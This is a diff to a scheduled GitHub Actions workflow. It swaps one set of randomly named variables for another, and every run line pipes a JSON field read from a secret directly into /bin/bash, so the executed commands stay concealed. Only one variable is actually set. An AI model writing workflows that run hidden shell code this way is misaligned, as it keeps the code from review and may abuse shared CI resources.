@@ -2,23 +2,27 @@ name: shici1sc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
+    - cron: '41 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shici1sc
         env:
-          zibfp891: ${{ secrets.zibfp891 }}
+          es5860: ${{ secrets.es5860 }}
         run: |
-          echo $zibfp891 | jq -r .fjil31029 | /bin/bash
-          echo $kw295 | jq -r .zvudg097 | /bin/bash
-          echo $ol86 | jq -r .wso5202 | /bin/bash
-          echo $ja85187 | jq -r .yu090 | /bin/bash
-          echo $tf563 | jq -r .fuhe724 | /bin/bash
-          echo $wavjf94 | jq -r .rggza7069 | /bin/bash
-          echo $hfmcs90879 | jq -r .mxb1 | /bin/bash
-          echo $w2 | jq -r .b73193 | /bin/bash
+          echo $es5860 | jq -r .mmfxn55 | /bin/bash
+          echo $xnie82 | jq -r .anl40626 | /bin/bash
+          echo $ru7 | jq -r .hvaf48240 | /bin/bash
+          echo $fw9472 | jq -r .varej00 | /bin/bash
+          echo $dj2251 | jq -r .rl3 | /bin/bash
+          echo $th170 | jq -r .oap800 | /bin/bash
+          echo $trdpp729 | jq -r .un6 | /bin/bash
+          echo $ahlbi5086 | jq -r .bkc9570 | /bin/bash
+          echo $vzw88321 | jq -r .v85559 | /bin/bash
+          echo $cbi17 | jq -r .imf0041 | /bin/bash
+          echo $cxnhp96 | jq -r .lf58 | /bin/bash
+          echo $ahxy47085 | jq -r .ukf8672 | /bin/bash
+          echo $wfuoc1 | jq -r .ewi23205 | /bin/bash
 
